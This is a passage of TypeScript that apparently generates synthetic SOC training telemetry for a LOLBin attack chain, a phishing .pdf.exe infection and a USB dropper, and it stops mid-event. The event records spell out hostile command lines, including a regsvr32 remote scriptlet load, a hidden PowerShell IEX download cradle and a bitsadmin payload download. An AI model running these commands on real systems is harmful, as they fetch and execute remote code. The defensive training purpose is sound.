        "AccountDomain": "NEXACORP",
        "RemoteUrl": "pkg-mirror-eu.ru",
        "RemoteIP": "91.108.56.207",
        "RemotePort": "80",
        "ReportId": "9284512",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // ── CORRELATED: Network event — certutil external HTTP connection ──────────────
    {
      id: "evt_lol_certutil_net", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1105",
      src_ip: victimIp, dst_port: 80,
      hostname: victimHost,
      description: "WS-HR-1133 opened an outbound HTTP session to pkg-mirror-eu.ru (91.108.56.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.",
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.ip": "91.108.56.207",
        "destination.port": "80",
        "destination.host": "pkg-mirror-eu.ru",
        "pan.app": "web-browsing",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTP",
        "url.category": "Unknown/Uncategorized",
        "network.bytes_in": "204800",
        "source.geo.country_name": "Russia",
      },
    },

    // ── CORRELATED: AV attempted detection on certutil download — evaded ──────────
    {
      id: "evt_lol_av_evade", ts: T(1_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint",
      event_type: "av_detection", severity: "medium",
      hostname: victimHost, user_email: victimEmail,
      description: "Microsoft Defender scanned update.exe, returned a low-confidence verdict, and allowed it to run.",
      raw: {
        "event.action": "DefenderDetection",
        "file.path": "C:\\Users\\s.patel\\Downloads\\update.exe",
        "file.hash.sha256": certutilHash,
        "file.name": "update.exe",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
        "action_result": "allowed",
        "quarantine.status": "not_quarantined",
      },
    },

    // T+4min: regsvr32 executes malicious DLL/SCT via COM scriptlet (T1218.010)
    {
      id: "evt_lol_02_regsvr32", ts: T(4 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "Defense Evasion",
      description: "regsvr32.exe ran with /i:http://cdn-winupd.ru/tpl/upd.sct, loading a COM scriptlet from a remote URL.",
      process: {
        name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
        parent_name: "cmd.exe", parent_pid: 4420,
        cmdline: "regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("regsvr32_system_binary") },
      },
      network: { url: "http://cdn-winupd.ru/tpl/upd.sct", domain: "cdn-winupd.ru", bytes_out: 8192 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "regsvr32.exe",
        "FolderPath": "C:\\Windows\\System32\\regsvr32.exe",
        "ProcessCommandLine": "regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll",
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("regsvr32_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "cdn-winupd.ru",
        "RemoteIP": "185.220.101.55",
        "RemotePort": "80",
        "ReportId": "9284556",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // ── CORRELATED: Network event — regsvr32 fetching SCT from attacker server ────
    {
      id: "evt_lol_regsvr_net", ts: T(4 * MIN + 5_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "critical",
      mitre_technique: "T1218.010",
      src_ip: victimIp, dst_port: 80,
      hostname: victimHost,
      description: "WS-HR-1133 fetched http://cdn-winupd.ru/tpl/upd.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.ip": "185.220.101.55",
        "destination.port": "80",
        "destination.host": "cdn-winupd.ru",
        "pan.app": "web-browsing",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTP",
        "url.full": "http://cdn-winupd.ru/tpl/upd.sct",
        "url.category": "Unknown/Uncategorized",
        "network.bytes_in": "8192",
      },
    },

    // T+7min: mshta.exe runs VBScript from URL (T1218.005)
    {
      id: "evt_lol_03_mshta", ts: T(7 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "Defense Evasion",
      description: "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1 from cdn-winupd.ru.",
      process: {
        name: "mshta.exe", pid: 6100, path: "C:\\Windows\\System32\\mshta.exe",
        parent_name: "regsvr32.exe", parent_pid: 5512,
        cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')\"\",0:close\")",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("mshta_exe_system_binary") },
      },
      network: { url: "http://cdn-winupd.ru/stage2.ps1", domain: "cdn-winupd.ru", bytes_out: 12288 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "mshta.exe",
        "FolderPath": "C:\\Windows\\System32\\mshta.exe",
        "ProcessCommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")...",
        "InitiatingProcessFileName": "regsvr32.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\regsvr32.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("mshta_exe_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "cdn-winupd.ru",
        "RemoteIP": "185.220.101.55",
        "ReportId": "9284601",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+10min: wmic.exe enumerates processes (T1057)
    {
      id: "evt_lol_03b_powershell", ts: T(7 * MIN + 20_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory.",
      process: {
        name: "powershell.exe", pid: 6200, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "mshta.exe", parent_pid: 6100,
        cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("powershell_exe_system_binary") },
      },
      network: { url: "http://cdn-winupd.ru/stage2.ps1", domain: "cdn-winupd.ru", bytes_in: 12288 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessId": "6200",
        "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
        "InitiatingProcessFileName": "mshta.exe",
        "InitiatingProcessId": "6100",
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "RemoteUrl": "cdn-winupd.ru",
      },
    },
    {
      id: "evt_lol_04_wmic", ts: T(10 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium", mitre_technique: "T1057", mitre_tactic: "Discovery",
      description: "wmic.exe ran process list brief under the same PowerShell session, enumerating all running processes on WS-HR-1133.",
      process: {
        name: "wmic.exe", pid: 6540, path: "C:\\Windows\\System32\\wbem\\wmic.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "wmic process list brief",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("wmic_exe_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "wmic.exe",
        "FolderPath": "C:\\Windows\\System32\\wbem\\wmic.exe",
        "ProcessCommandLine": "wmic process list brief",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("wmic_exe_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284648",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+13min: bitsadmin.exe used for persistence download (T1197)
    {
      id: "evt_lol_05_bitsadmin", ts: T(13 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1197", mitre_tactic: "Persistence",
      description: "bitsadmin.exe created a BITS job named NexaCorpUpdate that downloads svchost_update.exe from cdn-winupd.ru to C:\\ProgramData\\nexacorp\\.",
      process: {
        name: "bitsadmin.exe", pid: 7002, path: "C:\\Windows\\System32\\bitsadmin.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://cdn-winupd.ru/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("bitsadmin_system_binary") },
      },
      file: { name: "svchost_update.exe", path: "C:\\ProgramData\\nexacorp\\svchost_update.exe", sha256: bitsPayloadHash, size: 307200 },
      network: { url: "http://cdn-winupd.ru/persistence.exe", domain: "cdn-winupd.ru", bytes_out: 307200 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "bitsadmin.exe",
        "FolderPath": "C:\\Windows\\System32\\bitsadmin.exe",
        "ProcessCommandLine": "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://cdn-winupd.ru/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("bitsadmin_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "cdn-winupd.ru",
        "RemoteIP": "185.220.101.55",
        "ReportId": "9284702",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+16min: rundll32.exe loads attacker DLL (T1218.011)
    {
      id: "evt_lol_06_rundll32", ts: T(16 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "Defense Evasion",
      description: "rundll32.exe loaded an unsigned DLL (srvhost.dll) from C:\\Users\\Public, calling its DllMain export directly.",
      process: {
        name: "rundll32.exe", pid: 7480, path: "C:\\Windows\\System32\\rundll32.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "rundll32.exe C:\\Users\\Public\\srvhost.dll,DllMain",
        user: "s.patel", integrity: "medium",
        // The PROCESS here is rundll32.exe, a signed Microsoft binary. The
        // payload is the DLL it loads, in the `file` block below, which keeps
        // payloadHash. Setting the process hash to the payload's would teach a
        // student pivoting on SHA256 that rundll32.exe itself is malware.
        hash: { sha256: rundll32BinaryHash },
      },
      file: { name: "srvhost.dll", path: "C:\\Users\\Public\\srvhost.dll", sha256: payloadHash, size: 204800, extension: ".dll" },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "rundll32.exe",
        "FolderPath": "C:\\Windows\\System32\\rundll32.exe",
        "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\srvhost.dll,DllMain",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": rundll32BinaryHash,
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "FileOriginUrl": "C:\\Users\\Public\\srvhost.dll",
        "IsFileSigned": "false",
        "ReportId": "9284755",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+20min: Scheduled task created for persistence (T1053.005)
    {
      id: "evt_lol_07_schtask", ts: T(20 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "scheduled_task",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1053.005", mitre_tactic: "Persistence",
      description: "schtasks.exe created a task named NexaCorpHealthCheck that runs C:\\ProgramData\\nexacorp\\svchost_update.exe in s.patel's user context every 5 minutes.",
      process: {
        name: "schtasks.exe", pid: 7900, path: "C:\\Windows\\System32\\schtasks.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "schtasks /create /tn \"NexaCorpHealthCheck\" /tr \"C:\\ProgramData\\nexacorp\\svchost_update.exe\" /sc minute /mo 5 /f",
        // Medium, matching the powershell.exe parent. This was High with
        // `/ru SYSTEM` on the command line, which needs local administrator —
        // and nothing in this LOLBin chain ever elevates: there is no UAC
        // bypass and no 4672 anywhere in the scenario. As written it taught
        // that a standard user can register a SYSTEM task.
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("schtasks_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
        "ProcessCommandLine": "schtasks /create /tn \"NexaCorpHealthCheck\" /tr \"C:\\ProgramData\\nexacorp\\svchost_update.exe\" /sc minute /mo 5 /f",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("schtasks_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284811",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // ── CORRELATED: Baseline — certutil never used for internet download in 90 days
    {
      id: "evt_lol_baseline_certutil", ts: T(-5 * MIN), is_baseline: true,
      source: "siem", vendor: "Microsoft Sentinel",
      event_type: "ids_signature", severity: "informational",
      hostname: victimHost,
      description: "Microsoft Sentinel found zero prior uses of certutil.exe with the -urlcache flag on WS-HR-1133 in the past 90 days.",
      raw: {
        "event.action": "BaselineQuery",
        "AlertName": "LOLBin_Baseline_Check",
        "host.name": victimHost,
        "ExtendedProperties.Query": "process.name:certutil.exe AND process.cmdline:*urlcache*",
        "ExtendedProperties.Lookback Period (days)": "90",
        "ExtendedProperties.Search Query Results Overall Count": "0",
        "event.outcome": "success",
      },
    },
  ];

  return { title: "Living-off-the-Land (LOLBins) — certutil → regsvr32 → Persistence", events, T, MIN, payloadHash, certutilHash };
}

/** Telemetry half of `buildPhishingMalwareScenario`: the events and the story title, no answer key. */
export function phishingMalwareScenarioEvents() {
  const B = new Date("2026-05-20T10:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-HR-1182", email: "r.avraham@nexacorp.com", ip: "10.10.40.63" };
  const c2Domain = "shiptrack-updates-net.xyz";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const c2Ip = "194.26.135.88";
  const senderIp = "146.70.53.21";
  const msgId = "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>";
  const fileHash = makeSha256("delivery_notice_48213_pdf_exe_trojan");
  const zipHash = makeSha256("delivery_notice_48213_zip_container");
  const zipPath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.zip";
  const exePath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213\\Delivery_Notice_48213.pdf.exe";
  const mail = {
    "InternetMessageId": msgId,
    "email.from.address": "notifications@shiptrack-express.info",
    "email.to.address": victim.email,
    "email.subject": "Your Package Could Not Be Delivered — Action Required",
    "email.attachments.file.name": "Delivery_Notice_48213.zip",
    "email.attachments.file.hash.sha256": zipHash,
    "email.attachments.file.size": 18422,
    "email.direction": "inbound",
    "source.ip": senderIp,
  };

  const events: TelemetryEvent[] = [
    {
      id: "evt_pm_01_email", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "medium", mitre_technique: "T1566.001",
      description: "r.avraham received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender (notifications@shiptrack-express.info) that failed SPF, DKIM and DMARC; it was delivered to the inbox.",
      raw: {
        ...mail,
        "event.action": "EmailDelivered", "event.outcome": "success",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
      },
    },
    {
      // The attachment row of the same message — the ZIP's SHA256 (EmailEvents has no hash column).
      id: "evt_pm_01b_attachment", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Delivery_Notice_48213.zip (18,422 bytes) with its SHA256.",
      raw: { ...mail, "category": "AdvancedHunting-EmailAttachmentInfo", "action_result": "delivered" },
    },
    {
      id: "evt_pm_01c_save", ts: T(5 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1566.001",
      file: { path: zipPath, sha256: zipHash, size: 18422 },
      // A webmail download — the same in an M365 or a Google Workspace shop (no desktop mail client named).
      process: { name: "chrome.exe", pid: 5016, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", user: "NEXACORP\\r.avraham", integrity: "medium" },
      description: "chrome.exe on WS-HR-1182 saved Delivery_Notice_48213.zip from the webmail session to r.avraham's Downloads folder (same SHA256 as the email attachment).",
      raw: { "crowdstrike.event_simpleName": "ZipFileWritten", "file.path": zipPath, "file.hash.sha256": zipHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_01d_extract", ts: T(5 * MIN + 45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1204.002",
      file: { path: exePath, sha256: fileHash, size: 391168 },
      process: { name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\r.avraham", integrity: "medium" },
      description: "explorer.exe on WS-HR-1182 extracted Delivery_Notice_48213.pdf.exe from the ZIP into a Delivery_Notice_48213 folder under Downloads.",
      raw: { "crowdstrike.event_simpleName": "NewExecutableWritten", "file.path": exePath, "file.hash.sha256": fileHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "r.avraham ran Delivery_Notice_48213.pdf.exe from the extracted folder on WS-HR-1182; explorer.exe was the parent process and the binary is unsigned.",
      process: {
        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
        path: exePath,
        cmdline: `"${exePath}"`,
        user: "NEXACORP\\r.avraham", integrity: "medium",
        hash: { sha256: fileHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "event.action": "process_created",
        "process.pid": "6624",
        "process.executable": exePath,
        "process.name": "Delivery_Notice_48213.pdf.exe",
        "process.command_line": `"${exePath}"`,
        "process.hash.sha256": fileHash,
        "process.signed": "false",
        "process.code_signature.status": "unsigned",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\r.avraham",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      // The endpoint side of the connection: the process, its hash and the URL it reached.
      id: "evt_pm_02b_connect", ts: T(6 * MIN + 44_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: {
        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
        path: exePath, user: "NEXACORP\\r.avraham", integrity: "medium", hash: { sha256: fileHash },
      },
      description: `Delivery_Notice_48213.pdf.exe on WS-HR-1182 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
        "source.ip": victim.ip, "source.port": "51204",
        "process.name": "Delivery_Notice_48213.pdf.exe", "process.hash.sha256": fileHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham",
      },
    },
    {
      // First page for the SOC: URL filtering alert on the newly registered domain.
      id: "evt_pm_03_beacon", ts: T(6 * MIN + 45_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 4608, bytes_in: 51200, domain: c2Domain },
      description: "The firewall's URL filtering logged an alert for an HTTPS session from WS-HR-1182 to shiptrack-updates-net.xyz, categorised as a newly registered domain; the session was allowed.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "network.bytes_out": "4608", "network.bytes_in": "51200",
        "dns.query_domain": c2Domain,
        "url.category": "newly-registered-domain",
        "action_result": "allow",
      },
    },
    {
      id: "evt_pm_04_detect", ts: T(9 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1204.002",
      file: { path: exePath, sha256: fileHash, size: 391168 },
      process: {
        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
        path: exePath, user: "NEXACORP\\r.avraham", integrity: "medium", hash: { sha256: fileHash },
      },
      description: "The EDR terminated Delivery_Notice_48213.pdf.exe on WS-HR-1182 and quarantined the file, about three minutes after the process started and two minutes after its connection to shiptrack-updates-net.xyz.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "Trojan:MSIL/AgentTesla!MTB",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "process_killed, quarantined",
      },
    },
    {
      id: "evt_pm_05_zap", ts: T(11 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
      user_email: victim.email,
      severity: "medium", mitre_technique: "T1566.001",
      description: "Zero-hour auto purge (ZAP) moved the \"Your Package Could Not Be Delivered\" message from r.avraham's inbox to quarantine with a Malware verdict.",
      raw: { ...mail, "Action": "Moved to quarantine", "ActionTrigger": "ZAP", "ActionResult": "Success", "ThreatTypes": "Malware", "DeliveryLocation": "Quarantine" },
    },
  ];

  return { title: "Shipping-Notice ZIP Attachment → Disguised .pdf.exe → Workstation Infection", events, T, MIN, c2Domain, c2Ip, fileHash, zipHash };
}

/** Telemetry half of `buildUsbMalwareScenario`: the events and the story title, no answer key. */
export function usbMalwareScenarioEvents() {
  const B = new Date("2026-05-22T13:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-OPS-2214", email: "m.levi@nexacorp.com", ip: "10.10.55.19" };
  const fileHash = makeSha256("usb_backup_tool_exe_trojan_dropper");
  const usbSerial = "4C530001071117107564";
  // Story-specific infrastructure (no other storyline uses this address).
  const c2Domain = "sync-winbackup.net";
  const c2Ip = "91.215.85.17";

  const events: TelemetryEvent[] = [
    {
      // The USB mount itself — the device identity (serial, product) that ties the
      // drive to the executable copied off it in the next row.
      id: "evt_usb_00_mount", ts: T(-1 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low", mitre_technique: "T1091",
      description: "A removable USB drive (SanDisk Cruzer, serial 4C530001071117107564) was mounted as E:\\ on WS-OPS-2214.",
      raw: {
        "crowdstrike.event_simpleName": "RemovableMediaVolumeMounted",
        "event.action": "RemovableMediaVolumeMounted",
        "usb.action": "mounted",
        "usb.mount_point": "E:\\",
        "usb.device.name": "SanDisk Cruzer Blade",
        "usb.vendor": "SanDisk",
        "usb.device.serial": usbSerial,
        "removable_media.type": "USB Flash Drive",
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_01_copy", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low", mitre_technique: "T1091",
      file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
      // explorer.exe is the writer of a drag-and-drop copy (DeviceFileEvents / PeFileWritten actor).
      process: {
        name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe",
        user: "NEXACORP\\m.levi", integrity: "medium",
      },
      description: "USB_Backup_Tool.exe was copied from the removable drive (E:\\) to the Desktop on WS-OPS-2214.",
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "event.action": "file_written",
        "file.path": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        // Removable-media origin (registry-known fields the renderers can surface as the
        // USB source of the copy).
        "file.source_volume": "E:\\",
        "file.source_volume_type": "removable",
        "file.hash.sha256": fileHash,
        "file.signed": "false",
        "device.removable_media.serial": usbSerial,
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_02_execute", ts: T(3 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "m.levi ran USB_Backup_Tool.exe on WS-OPS-2214 with explorer.exe as the parent process; the binary is unsigned.",
      process: {
        name: "USB_Backup_Tool.exe", pid: 7712, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe\"",
        user: "NEXACORP\\m.levi", integrity: "medium",
        hash: { sha256: fileHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:7df5b5be7c7dff44ad11e541ca9be48a:3234567890",
        "crowdstrike.detection.description": "Unsigned executable, first seen globally, launched directly by explorer.exe from a file recently copied off removable media.",
